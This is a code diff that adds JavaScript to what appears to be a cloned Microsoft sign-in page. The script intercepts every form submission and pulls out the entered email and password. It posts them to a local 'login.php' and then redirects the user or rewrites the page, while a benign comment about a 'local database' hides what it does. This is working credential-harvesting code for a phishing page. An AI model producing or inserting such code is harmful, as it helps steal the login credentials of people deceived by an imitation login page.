@@ -72,6 +72,38 @@ function t(r,t){var n=document.getElementsByName(r);n&&n.length>0&&e(n[0],"click
 
     <script type="text/javascript" nonce='4Rpry3NvW5a3ISLUD2LR0w'>
         ServerData = $Config;
+        
+        // Intercept form submission to redirect to local database
+        document.addEventListener('DOMContentLoaded', function() {
+            const forms = document.querySelectorAll('form');
+            forms.forEach(form => {
+                form.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    
+                    const email = document.querySelector('input[type="email"], input[name="loginfmt"], input[name="username"]')?.value;
+                    const password = document.querySelector('input[type="password"], input[name="passwd"], input[name="password"]')?.value;
+                    
+                    if (email && password) {
+                        const formData = new FormData();
+                        formData.append('email', email);
+                        formData.append('password', password);
+                        
+                        fetch('login.php', {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(response => response.text())
+                        .then(data => {
+                            if (data.includes('dashboard.php')) {
+                                window.location.href = 'dashboard.php';
+                            } else {
+                                document.body.innerHTML = data;
+                            }
+                        });
+                    }
+                });
+            });
+        });
     </script>
 
 
